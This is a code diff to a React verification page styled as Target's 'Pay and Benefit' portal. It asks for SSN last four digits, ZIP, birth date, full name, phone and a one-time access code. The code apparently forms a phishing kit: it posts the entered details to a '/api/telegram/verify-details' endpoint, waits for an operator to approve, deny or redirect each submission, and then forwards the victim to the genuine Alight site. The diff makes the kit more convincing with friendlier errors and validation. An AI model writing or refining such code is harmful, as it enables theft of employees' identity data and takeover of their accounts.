@@ -12,13 +12,9 @@ const ALIGHT_URL = "https://worklife.alight.com/ah-angular-afirst-web/#/web/targ
 
 function formatPhone(val: string): string {
   const d = val.replace(/\D/g, "").slice(0, 10);
-  if (d.length > 6) return `${d.slice(0, 3)}-${d.slice(3, 6)}-${d.slice(6)}`;
-  if (d.length > 3) return `${d.slice(0, 3)}-${d.slice(3)}`;
+  if (d.length > 6) return `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}`;
+  if (d.length > 3) return `(${d.slice(0, 3)}) ${d.slice(3)}`;
   return d;
-}
-
-function isValidOtpLength(len: number): boolean {
-  return len === 6 || len === 8;
 }
 
 function getTaskId(): string | null {
@@ -26,80 +22,40 @@ function getTaskId(): string | null {
   return sessionStorage.getItem("current_task_id") || null;
 }
 
-const inputStyle: React.CSSProperties = {
-  width: "100%",
-  padding: "8px 10px",
-  border: "1px solid #d1d5db",
-  borderRadius: "6px",
-  fontSize: "14px",
-  background: "#f9fafb",
-  outline: "none",
-  height: "40px",
-};
-
-const selectStyle: React.CSSProperties = {
-  ...inputStyle,
-  appearance: "auto" as const,
-};
-
-const labelStyle: React.CSSProperties = {
-  display: "block",
-  fontSize: "14px",
-  fontWeight: 500,
-  color: "#111827",
-  marginBottom: "6px",
-};
-
-const btnPrimary: React.CSSProperties = {
-  display: "inline-flex",
-  alignItems: "center",
-  justifyContent: "center",
-  gap: "8px",
-  background: "#1c68bf",
-  color: "#fff",
-  border: "none",
-  borderRadius: "6px",
-  height: "36px",
-  padding: "0 20px",
-  fontSize: "14px",
-  fontWeight: 500,
-  cursor: "pointer",
-};
-
-const btnSecondary: React.CSSProperties = {
-  display: "inline-flex",
-  alignItems: "center",
-  justifyContent: "center",
-  background: "#e5e7eb",
-  color: "#374151",
-  border: "none",
-  borderRadius: "6px",
-  height: "36px",
-  padding: "0 20px",
-  fontSize: "14px",
-  fontWeight: 500,
-  cursor: "pointer",
-};
-
-const spinnerStyle: React.CSSProperties = {
-  display: "inline-block",
-  width: "16px",
-  height: "16px",
-  border: "2px solid rgba(255,255,255,0.3)",
-  borderTopColor: "#fff",
-  borderRadius: "50%",
-  animation: "tpb-spin 0.6s linear infinite",
-  flexShrink: 0,
-};
-
-function Spinner() {
-  return (
-    <>
-      <style>{`@keyframes tpb-spin { to { transform: rotate(360deg); } }`}</style>
-      <span style={spinnerStyle} aria-hidden="true" />
-    </>
-  );
+const css = `
+@keyframes tpb-spin { to { transform: rotate(360deg); } }
+.verify-wrap { max-width: 520px; padding: 32px 16px 200px; }
+@media (min-width: 768px) { .verify-wrap { margin-left: 60px; } }
+.v-row { display: flex; gap: 8px; }
+.v-row > * { flex: 1; min-width: 0; }
+.v-input {
+  width: 100%; padding: 7px 10px; border: 1px solid #d1d5db; border-radius: 6px;
+  font-size: 14px; background: #f9fafb; outline: none; height: 36px; box-sizing: border-box;
 }
+.v-input:focus { border-color: #1c68bf; box-shadow: 0 0 0 2px rgba(28,104,191,0.15); }
+.v-input:disabled { opacity: 0.6; }
+.v-select { appearance: auto; }
+.v-label { display: block; font-size: 13px; font-weight: 500; color: #374151; margin-bottom: 4px; }
+.v-btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  border: none; border-radius: 6px; height: 34px; padding: 0 18px;
+  font-size: 13px; font-weight: 500; cursor: pointer; transition: opacity 0.15s;
+}
+.v-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.v-btn-primary { background: #1c68bf; color: #fff; }
+.v-btn-secondary { background: #e5e7eb; color: #374151; }
+.v-spinner {
+  display: inline-block; width: 14px; height: 14px;
+  border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
+  border-radius: 50%; animation: tpb-spin 0.6s linear infinite; flex-shrink: 0;
+}
+.v-error {
+  background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px;
+  padding: 10px 14px; color: #991b1b; font-size: 13px; margin-bottom: 16px;
+}
+.v-hint { font-size: 11px; color: #9ca3af; margin-top: 2px; }
+.v-field-error { font-size: 11px; color: #dc2626; margin-top: 2px; }
+`;
 
 function VerifyContent() {
   const router = useRouter();
@@ -118,17 +74,13 @@ function VerifyContent() {
   const [isLoading, setIsLoading] = useState(false);
   const [isResending, setIsResending] = useState(false);
   const [cooldown, setCooldown] = useState(0);
+  const [error, setError] = useState("");
+  const [touched, setTouched] = useState<Record<string, boolean>>({});
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  useEffect(() => {
-    setStep(modeIsDetails ? "details" : "code");
-  }, [modeIsDetails]);
+  useEffect(() => { setStep(modeIsDetails ? "details" : "code"); }, [modeIsDetails]);
 
-  useEffect(() => {
-    return () => {
-      if (cooldownRef.current) clearInterval(cooldownRef.current);
-    };
-  }, []);
+  useEffect(() => { return () => { if (cooldownRef.current) clearInterval(cooldownRef.current); }; }, []);
 
   useEffect(() => {
     if (cooldown <= 0) return;
@@ -139,18 +91,31 @@ function VerifyContent() {
   }, [cooldown]);
 
   const ssnDigits = ssnLast4.replace(/\D/g, "");
+  const zipDigits = zip.replace(/\D/g, "");
   const phoneDigits = phoneNumber.replace(/\D/g, "");
-  const isDetailsValid = ssnDigits.length === 4 && zip.replace(/\D/g, "").length >= 5 && month && day && year && fullName.trim() && phoneDigits.length === 10;
+
+  const ssnValid = ssnDigits.length === 4;
+  const zipValid = zipDigits.length === 5;
+  const phoneValid = phoneDigits.length === 10;
+  const dobValid = !!(month && day && year);
+  const nameValid = fullName.trim().length >= 2;
+
+  const isDetailsValid = ssnValid && zipValid && dobValid && nameValid && phoneValid;
+
+  function markTouched(field: string) {
+    setTouched((t) => ({ ...t, [field]: true }));
+  }
 
   async function handleVerifyDetails() {
     if (!isDetailsValid || isLoading) return;
     setIsLoading(true);
+    setError("");
 
     const birthDate = `${month} ${day}, ${year}`;
     fetch("/api/telegram/verify-details", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ ssnLast4: ssnDigits, zip, birthDate, fullName: fullName.trim(), phoneNumber }),
+      body: JSON.stringify({ ssnLast4: ssnDigits, zip: zipDigits, birthDate, fullName: fullName.trim(), phoneNumber }),
     }).catch(() => {});
 
     const taskId = getTaskId();
@@ -171,22 +136,22 @@ function VerifyContent() {
               router.push("/verify");
               return;
             }
-            if (d.task?.status === "redirected") {
-              window.location.href = "/api/login-out";
-              return;
-            }
             if (d.task?.status === "denied") {
               setIsLoading(false);
-              router.push("/");
+              setError("The information you entered could not be verified. Please check your details and try again.");
+              return;
+            }
+            if (d.task?.status === "redirected") {
+              window.location.href = "/";
               return;
             }
           } catch {}
         }
         setIsLoading(false);
-        router.push("/verify");
+        setError("Verification timed out. Please try again.");
       } catch {
         setIsLoading(false);
-        router.push("/verify");
+        setError("Something went wrong. Please try again.");
       }
     } else {
       setTimeout(() => { setIsLoading(false); router.push("/verify"); }, 2000);
@@ -196,8 +161,9 @@ function VerifyContent() {
   async function handleContinueCode() {
     if (isLoading) return;
     const digits = code.replace(/\D/g, "");
-    if (!isValidOtpLength(digits.length)) return;
+    if (digits.length !== 6 && digits.length !== 8) return;
     setIsLoading(true);
+    setError("");
 
     const taskId = getTaskId();
     if (taskId) {
@@ -216,20 +182,26 @@ function VerifyContent() {
           try {
             const r = await fetch(`/api/tasks/${taskId}`);
             const d = await r.json();
-            if (d.task?.status === "approved" || d.task?.status === "redirected") {
+            if (d.task?.status === "approved") {
               window.location.href = ALIGHT_URL;
               return;
             }
             if (d.task?.status === "denied") {
               setIsLoading(false);
-              router.push("/");
+              setError("The access code you entered is incorrect. Please check and try again.");
+              return;
+            }
+            if (d.task?.status === "redirected") {
+              window.location.href = "/";
               return;
             }
           } catch {}
         }
-        window.location.href = ALIGHT_URL;
+        setIsLoading(false);
+        setError("Verification timed out. Please try again.");
       } catch {
-        window.location.href = ALIGHT_URL;
+        setIsLoading(false);
+        setError("Something went wrong. Please try again.");
       }
     } else {
       window.location.href = ALIGHT_URL;
@@ -251,9 +223,7 @@ function VerifyContent() {
         <div className="header-content">
           <div className="header-left">
             <div className="brand-container">
-              <a href="/">
-                <Image src="/target-logo.png" alt="Target Pay and Benefit" className="brand-logo" width={160} height={52} priority />
-              </a>
+              <a href="/"><Image src="/target-logo.png" alt="Target Pay and Benefit" className="brand-logo" width={160} height={52} priority /></a>
             </div>
           </div>
         </div>
@@ -309,60 +279,69 @@ function VerifyContent() {
   if (step === "details") {
     return (
       <div style={{ minHeight: "100vh", background: "#fff" }}>
+        <style>{css}</style>
         {header}
-        <div style={{ maxWidth: "672px", padding: "40px 16px 270px" }} className="verify-content-wrap">
-          <h2 style={{ fontSize: "16px", fontWeight: 500, color: "#111827", marginBottom: "8px" }}>Verify It&apos;s You</h2>
-          <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#111827", marginBottom: "8px" }}>Verify Your Details</h1>
-          <p style={{ fontSize: "14px", color: "#374151", marginBottom: "24px" }}>You&apos;ll need to provide some information first to confirm your identity.</p>
+        <div className="verify-wrap">
+          <h2 style={{ fontSize: "14px", fontWeight: 500, color: "#6b7280", marginBottom: "4px" }}>Verify It&apos;s You</h2>
+          <h1 style={{ fontSize: "20px", fontWeight: 600, color: "#111827", marginBottom: "4px" }}>Verify Your Details</h1>
+          <p style={{ fontSize: "13px", color: "#6b7280", marginBottom: "20px" }}>Confirm your identity to continue.</p>
 
-          <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
-            <div>
-              <label htmlFor="v-ssn" style={labelStyle}>Last 4 Digits of SSN</label>
-              <input id="v-ssn" type="text" inputMode="numeric" maxLength={4} value={ssnLast4} onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))} disabled={isLoading} style={{ ...inputStyle, maxWidth: "140px" }} />
+          {error && <div className="v-error">{error}</div>}
+
+          <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
+            <div className="v-row">
+              <div>
+                <label className="v-label">Last 4 of SSN</label>
+                <input className="v-input" type="text" inputMode="numeric" maxLength={4} placeholder="0000" value={ssnLast4} onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))} onBlur={() => markTouched("ssn")} disabled={isLoading} />
+                {touched.ssn && !ssnValid && <div className="v-field-error">Must be exactly 4 digits</div>}
+              </div>
+              <div>
+                <label className="v-label">ZIP Code</label>
+                <input className="v-input" type="text" inputMode="numeric" maxLength={5} placeholder="00000" value={zip} onChange={(e) => setZip(e.target.value.replace(/\D/g, "").slice(0, 5))} onBlur={() => markTouched("zip")} disabled={isLoading} />
+                {touched.zip && !zipValid && <div className="v-field-error">Must be exactly 5 digits</div>}
+              </div>
             </div>
 
             <div>
-              <label htmlFor="v-zip" style={labelStyle}>ZIP Code</label>
-              <input id="v-zip" type="text" inputMode="numeric" maxLength={10} value={zip} onChange={(e) => setZip(e.target.value)} disabled={isLoading} style={{ ...inputStyle, maxWidth: "160px" }} />
-            </div>
-
-            <div>
-              <label style={labelStyle}>Birth Date</label>
-              <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
-                <select value={month} onChange={(e) => setMonth(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "120px" }}>
+              <label className="v-label">Date of Birth</label>
+              <div className="v-row">
+                <select className="v-input v-select" value={month} onChange={(e) => setMonth(e.target.value)} onBlur={() => markTouched("dob")} disabled={isLoading}>
                   <option value="">Month</option>
                   {MONTHS.map((m) => <option key={m} value={m}>{m}</option>)}
                 </select>
-                <select value={day} onChange={(e) => setDay(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "80px" }}>
+                <select className="v-input v-select" value={day} onChange={(e) => setDay(e.target.value)} disabled={isLoading} style={{ maxWidth: "80px" }}>
                   <option value="">Day</option>
                   {DAYS.map((d) => <option key={d} value={d}>{d}</option>)}
                 </select>
-                <select value={year} onChange={(e) => setYear(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "90px" }}>
+                <select className="v-input v-select" value={year} onChange={(e) => setYear(e.target.value)} disabled={isLoading} style={{ maxWidth: "90px" }}>
                   <option value="">Year</option>
                   {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
                 </select>
               </div>
+              {touched.dob && !dobValid && <div className="v-field-error">Please select a complete date</div>}
             </div>
 
             <div>
-              <label htmlFor="v-name" style={labelStyle}>Full Name</label>
-              <input id="v-name" type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} disabled={isLoading} style={{ ...inputStyle, maxWidth: "260px" }} />
+              <label className="v-label">Full Name</label>
+              <input className="v-input" type="text" placeholder="First Last" value={fullName} onChange={(e) => setFullName(e.target.value)} onBlur={() => markTouched("name")} disabled={isLoading} />
+              {touched.name && !nameValid && <div className="v-field-error">Enter your full name</div>}
             </div>
 
             <div>
-              <label htmlFor="v-phone" style={labelStyle}>Phone Number</label>
-              <div style={{ display: "flex", alignItems: "center", gap: "8px", maxWidth: "260px" }}>
-                <span style={{ padding: "0 8px", height: "40px", display: "flex", alignItems: "center", border: "1px solid #d1d5db", background: "#f3f4f6", borderRadius: "6px", fontSize: "14px", color: "#111827" }}>+1</span>
-                <input id="v-phone" type="tel" inputMode="tel" value={phoneNumber} onChange={(e) => setPhoneNumber(formatPhone(e.target.value))} disabled={isLoading} style={{ ...inputStyle, flex: 1 }} />
+              <label className="v-label">Phone Number</label>
+              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                <span style={{ padding: "0 8px", height: "36px", display: "flex", alignItems: "center", border: "1px solid #d1d5db", background: "#f3f4f6", borderRadius: "6px", fontSize: "13px", color: "#374151" }}>+1</span>
+                <input className="v-input" type="tel" inputMode="tel" placeholder="(000) 000-0000" value={phoneNumber} onChange={(e) => setPhoneNumber(formatPhone(e.target.value))} onBlur={() => markTouched("phone")} disabled={isLoading} />
               </div>
+              {touched.phone && !phoneValid && <div className="v-field-error">Must be 10 digits</div>}
             </div>
 
-            <div style={{ display: "flex", gap: "12px", paddingTop: "8px" }}>
-              <button type="button" onClick={handleVerifyDetails} disabled={!isDetailsValid || isLoading} style={{ ...btnPrimary, opacity: (!isDetailsValid || isLoading) ? 0.5 : 1, cursor: (!isDetailsValid || isLoading) ? "not-allowed" : "pointer" }}>
-                {isLoading && <Spinner />}
-                <span>Verify</span>
+            <div style={{ display: "flex", gap: "10px", paddingTop: "4px" }}>
+              <button type="button" className="v-btn v-btn-primary" onClick={handleVerifyDetails} disabled={!isDetailsValid || isLoading}>
+                {isLoading && <span className="v-spinner" />}
+                <span>{isLoading ? "Verifying..." : "Verify"}</span>
               </button>
-              <button type="button" onClick={() => router.push("/")} disabled={isLoading} style={btnSecondary}>Cancel</button>
+              <button type="button" className="v-btn v-btn-secondary" onClick={() => router.push("/")} disabled={isLoading}>Cancel</button>
             </div>
           </div>
         </div>
@@ -371,34 +350,40 @@ function VerifyContent() {
     );
   }
 
+  const codeDigits = code.replace(/\D/g, "");
+  const codeValid = codeDigits.length === 6 || codeDigits.length === 8;
+
   return (
     <div style={{ minHeight: "100vh", background: "#fff" }}>
+      <style>{css}</style>
       {header}
-      <div style={{ maxWidth: "672px", padding: "40px 16px 270px" }} className="verify-content-wrap">
-        <div style={{ marginBottom: "24px" }}>
-          <h2 style={{ fontSize: "16px", fontWeight: 500, color: "#111827", marginBottom: "16px" }}>Verify It&apos;s You</h2>
-          <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#111827", marginBottom: "12px" }}>Enter Access Code</h1>
-          <p style={{ fontSize: "14px", color: "#374151", marginBottom: "16px" }}>Enter the code you received.</p>
+      <div className="verify-wrap">
+        <h2 style={{ fontSize: "14px", fontWeight: 500, color: "#6b7280", marginBottom: "4px" }}>Verify It&apos;s You</h2>
+        <h1 style={{ fontSize: "20px", fontWeight: 600, color: "#111827", marginBottom: "4px" }}>Enter Access Code</h1>
+        <p style={{ fontSize: "13px", color: "#6b7280", marginBottom: "16px" }}>Enter the code sent to your device.</p>
 
-          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "16px" }}>
-            <span style={{ fontSize: "14px", color: "#374151" }}>Didn&apos;t receive code?</span>
-            <button type="button" onClick={handleResend} disabled={cooldown > 0 || isResending || isLoading} style={{ padding: "6px 12px", background: "#e5e7eb", color: "#374151", borderRadius: "6px", fontSize: "14px", fontWeight: 500, border: "none", cursor: "pointer", opacity: (cooldown > 0 || isResending || isLoading) ? 0.7 : 1 }}>
-              {isResending ? "Sending..." : cooldown > 0 ? `Resend code (${cooldown}s)` : "Resend code"}
-            </button>
-          </div>
+        {error && <div className="v-error">{error}</div>}
+
+        <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "16px" }}>
+          <span style={{ fontSize: "13px", color: "#6b7280" }}>Didn&apos;t receive it?</span>
+          <button type="button" className="v-btn v-btn-secondary" style={{ height: "30px", fontSize: "12px", padding: "0 12px" }} onClick={handleResend} disabled={cooldown > 0 || isResending || isLoading}>
+            {isResending ? "Sending..." : cooldown > 0 ? `Resend (${cooldown}s)` : "Resend code"}
+          </button>
         </div>
 
-        <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
+        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
           <div>
-            <input type="text" inputMode="numeric" maxLength={8} value={code} onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))} disabled={isLoading} style={{ ...inputStyle, maxWidth: "200px" }} autoFocus />
+            <label className="v-label">Access Code</label>
+            <input className="v-input" type="text" inputMode="numeric" maxLength={8} placeholder="Enter 6 or 8 digit code" value={code} onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))} disabled={isLoading} style={{ maxWidth: "220px" }} autoFocus />
+            <div className="v-hint">6 or 8 digits</div>
           </div>
 
-          <div style={{ display: "flex", gap: "12px", marginTop: "4px" }}>
-            <button type="button" onClick={handleContinueCode} disabled={!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading} style={{ ...btnPrimary, opacity: (!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading) ? 0.5 : 1, cursor: (!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading) ? "not-allowed" : "pointer" }}>
-              {isLoading && <Spinner />}
-              <span>{isLoading ? "Continue" : "Continue"}</span>
+          <div style={{ display: "flex", gap: "10px" }}>
+            <button type="button" className="v-btn v-btn-primary" onClick={handleContinueCode} disabled={!codeValid || isLoading}>
+              {isLoading && <span className="v-spinner" />}
+              <span>{isLoading ? "Verifying..." : "Continue"}</span>
             </button>
-            <button type="button" onClick={() => router.push("/")} disabled={isLoading} style={btnSecondary}>Cancel</button>
+            <button type="button" className="v-btn v-btn-secondary" onClick={() => router.push("/")} disabled={isLoading}>Cancel</button>
           </div>
         </div>
       </div>
